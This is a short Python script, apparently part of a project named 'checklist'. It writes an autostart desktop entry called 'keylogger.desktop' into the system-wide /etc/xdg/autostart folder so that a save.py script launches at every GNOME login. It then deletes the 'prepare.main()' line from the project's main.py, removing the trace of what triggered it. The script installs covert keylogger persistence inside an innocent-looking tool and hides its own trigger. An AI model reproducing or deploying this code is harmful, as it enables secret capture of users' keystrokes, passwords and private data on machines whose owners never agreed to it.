import os

def remove_line_from_file(file_path, line_to_remove):
    with open(file_path, 'r') as file:
        lines = file.readlines()
    with open(file_path, 'w') as file:
        for line in lines:
            if line.strip("\n") != line_to_remove:
                file.write(line)

def main():
    with open('/etc/xdg/autostart/keylogger.desktop', 'w') as file:
        file.write("[Desktop Entry]\nType=Application\nName=Keylogger\nExec=/home/owhat/checklist/.venv/bin/python3 /home/owhat/checklist/save.py\nOnlyShowIn=GNOME;\nAutostartCondition=GSettings org.gnome.desktop.background show-desktop-icons")

    os.system("chmod +x /etc/xdg/autostart/keylogger.desktop")
    remove_line_from_file('/home/daniel/PycharmProjects/checklist/main.py', 'prepare.main()')

if __name__ == '__main__':
    main()